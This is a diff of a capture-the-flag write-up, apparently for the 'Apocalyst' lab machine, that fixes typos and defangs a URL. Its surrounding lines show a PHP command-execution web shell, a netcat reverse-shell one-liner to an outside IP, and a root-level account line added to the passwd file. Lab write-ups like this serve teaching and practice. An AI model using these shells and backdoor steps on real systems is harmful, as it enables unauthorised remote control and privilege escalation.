@@ -44,7 +44,7 @@ gobuster -u http://apocalyst.htb dir -w /usr/share/wordlists/dirbuster/directory
 ```
 
 Almost every word in the wordlist responses with a HTTP Code 301 and when we browse to them we always get the same page with just an image.
-The pages redirect to a page with an appending slash an the end of the path and have a length of 157.
+The pages redirect to a page with an appending slash at the end of the path and have a length of 157.
 
 When we use the parameter for a trailing slash in _Gobuster_ then we get a HTTP Code 200 for every word in the wordlist.
 Lets use **Cewl** to generate a wordlist based upon the words from the blog page:
@@ -100,7 +100,7 @@ echo system($\_REQUEST['cmd']);
 ?>
 ```
 
-Browsing to "http://apocalyst.htb/?cmd=whoami" outputs _www-data_ from the `whoami` command in the source.
+Browsing to "hxxp://apocalyst.htb/?cmd=whoami" outputs _www-data_ from the `whoami` command in the source.
 With this command execution we can start a reverse shell:
 ```markdown
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 9001 >/tmp/f
@@ -133,4 +133,4 @@ And then edit the file to create _newuser_ with the pasword and UserID and Group
 newuser:$1$newuser$82ynj4089D97/6jtzM22O.:0:0:root:/root:/bin/bash
 ```
 
-Now we can switch with ´su newuser´ to the created user and start a root shell!
+Now we can switch with `su newuser` to the created user and start a root shell!
